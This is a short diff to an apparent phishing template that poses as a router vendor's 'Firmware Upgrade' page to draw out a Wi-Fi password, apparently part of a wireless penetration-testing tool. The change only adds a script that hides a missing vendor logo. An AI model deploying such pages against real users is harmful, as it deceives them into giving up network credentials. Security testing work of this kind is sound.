@@ -134,7 +134,7 @@
   <!-- Start page content -->
   <div class="container">
 	   <div class="col-sm">
-       <center><img src="/static/{{ target_ap_logo_path }}"></img></center>
+       <center><img id="ap_logo_path" src="/static/{{ target_ap_logo_path }}"></img></center>
        <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade</h2>
     	 <p class="lead">A new version of the {{ target_ap_vendor }} firmware ({{ firmware_version }}) has been detected and awaiting installation. Please review the following terms and conditions and proceed.</p>
      </div>
@@ -236,7 +236,11 @@ In no event shall {{ target_ap_vendor }} Company or any other party which has be
   <!-- End empty password message -->
 
 <script>
-
+/* If we don't have the logo just not display the image */
+var match = /^http:.*static\/$/.exec(document.getElementById("ap_logo_path").src);
+if (match) {
+    document.getElementById('ap_logo_path').style.display = 'none';
+}
 /*
   Check the password field and act accordingly.
 */
